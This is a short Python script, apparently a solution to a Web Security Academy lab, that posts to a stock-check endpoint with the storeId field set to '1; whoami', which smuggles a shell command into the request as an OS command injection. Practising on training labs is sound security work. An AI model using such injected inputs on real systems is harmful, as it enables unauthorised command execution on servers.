import requests

s = requests.Session()
stock_post_url = 'https://0a2b000c0317b9c280b4a83e0081004d.web-security-academy.net/product/stock'
post_data = {
    'productId': '1',
    'storeId': '1; whoami'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)
